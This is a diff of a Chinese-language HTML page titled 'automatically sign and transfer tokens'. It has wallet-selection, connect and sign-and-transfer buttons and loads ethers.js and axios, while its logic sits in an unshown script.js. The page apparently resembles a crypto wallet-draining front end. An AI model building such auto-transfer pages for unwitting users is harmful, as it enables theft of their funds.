@@ -1,16 +1,16 @@
 <!DOCTYPE html>
-<html lang="zh">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>自动签名并转移代币</title>
     <link rel="stylesheet" href="styles.css">
-    <script src="https://cdn.jsdelivr.net/npm/ethers/dist/ethers.umd.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/ethers/dist/ethers.min.js"></script> <!-- 确保加载 ethers.js -->
 </head>
 <body>
     <div class="container">
         <h1>自动签名并转移代币</h1>
-        
+
         <label for="walletSelector">选择钱包类型:</label>
         <select id="walletSelector">
             <option value="metamask">MetaMask</option>
@@ -21,12 +21,13 @@
             <ul id="walletList"></ul>
         </div>
 
-        <button id="connectButton">连接钱包</button>
+        <button id="connectButton">链接钱包</button>
         <button id="signButton" disabled>签名确认并转移代币</button>
 
         <div id="status"></div>
     </div>
 
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/axios/0.21.1/axios.min.js"></script>
     <script src="script.js"></script>
 </body>
 </html>
